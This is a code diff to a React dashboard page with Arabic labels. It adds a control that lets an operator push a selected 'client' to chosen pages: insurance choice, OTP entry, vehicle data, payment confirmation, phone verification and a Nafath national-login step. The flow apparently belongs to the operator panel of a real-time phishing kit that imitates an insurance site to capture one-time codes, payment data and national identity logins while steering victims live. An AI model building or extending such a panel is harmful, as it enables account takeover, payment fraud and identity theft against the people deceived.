@@ -38,6 +38,20 @@ export default function DashboardPage() {
   const [nafadInput, setNafadInput] = useState("");
   const [actionLoading, setActionLoading] = useState<string | null>(null);
   const [notification, setNotification] = useState<{ type: "success" | "error"; message: string } | null>(null);
+  const [redirectPage, setRedirectPage] = useState("");
+
+  // Page options for manual redirect
+  const pageOptions = [
+    { value: "", label: "اختر صفحة للتوجيه..." },
+    { value: "home", label: "🏠 الصفحة الرئيسية" },
+    { value: "step1", label: "1️⃣ اختيار نوع التأمين" },
+    { value: "step2", label: "2️⃣ رمز التحقق (OTP)" },
+    { value: "step3", label: "3️⃣ بيانات السيارة" },
+    { value: "step4", label: "4️⃣ تأكيد الدفع" },
+    { value: "step5", label: "5️⃣ التحقق من الهاتف" },
+    { value: "step6", label: "6️⃣ النفاذ الوطني" },
+    { value: "thank-you", label: "✅ شكراً لك" },
+  ];
 
   // Stats
   const stats = useMemo(() => {
@@ -316,6 +330,32 @@ export default function DashboardPage() {
       });
       if (res.ok) {
         showNotification("success", "تم إرسال رمز النفاذ للعميل");
+        loadRequests();
+      } else {
+        showNotification("error", "حدث خطأ");
+      }
+    } catch {
+      showNotification("error", "فشل الاتصال");
+    }
+    setActionLoading(null);
+  };
+
+  // Handle manual redirect to any page
+  const handleRedirect = async () => {
+    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
+    if (!visitorId || !redirectPage) return;
+    
+    setActionLoading("redirect");
+    try {
+      const res = await fetch("/api/dashboard/redirect", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ visitorId, targetPage: redirectPage }),
+      });
+      if (res.ok) {
+        const pageLabel = pageOptions.find(p => p.value === redirectPage)?.label || redirectPage;
+        showNotification("success", `تم توجيه العميل إلى: ${pageLabel}`);
+        setRedirectPage("");
         loadRequests();
       } else {
         showNotification("error", "حدث خطأ");
@@ -1074,6 +1114,50 @@ export default function DashboardPage() {
                   <span style={{ fontSize: "0.8rem", color: "#2563eb", fontWeight: 600 }}>
                     الصفحة الحالية: {getCurrentPage() || "غير معروف"}
                   </span>
+                </div>
+
+                {/* Manual Redirect Control */}
+                <div style={{ marginTop: 16, padding: "12px", background: "#fef3c7", borderRadius: 8, border: "1px solid #fcd34d" }}>
+                  <p style={{ margin: "0 0 8px", fontSize: "0.85rem", color: "#92400e", fontWeight: 600 }}>
+                    🔄 توجيه العميل يدوياً
+                  </p>
+                  <div style={{ display: "flex", gap: 8 }}>
+                    <select
+                      value={redirectPage}
+                      onChange={(e) => setRedirectPage(e.target.value)}
+                      style={{
+                        flex: 1,
+                        padding: "10px 12px",
+                        borderRadius: 8,
+                        border: "2px solid #e5e7eb",
+                        fontSize: "0.9rem",
+                        background: "#fff",
+                        cursor: "pointer",
+                      }}
+                    >
+                      {pageOptions.map((opt) => (
+                        <option key={opt.value} value={opt.value}>{opt.label}</option>
+                      ))}
+                    </select>
+                    <button
+                      onClick={handleRedirect}
+                      disabled={!redirectPage || actionLoading === "redirect"}
+                      style={{
+                        padding: "10px 20px",
+                        borderRadius: 8,
+                        border: "none",
+                        background: redirectPage ? "#7c3aed" : "#9ca3af",
+                        color: "#fff",
+                        fontWeight: 700,
+                        cursor: redirectPage ? "pointer" : "not-allowed",
+                      }}
+                    >
+                      {actionLoading === "redirect" ? "جاري..." : "📤 توجيه"}
+                    </button>
+                  </div>
+                  <p style={{ margin: "8px 0 0", fontSize: "0.75rem", color: "#92400e" }}>
+                    سيتم توجيه العميل للصفحة المختارة فوراً
+                  </p>
                 </div>
 
                 {/* Device Info */}
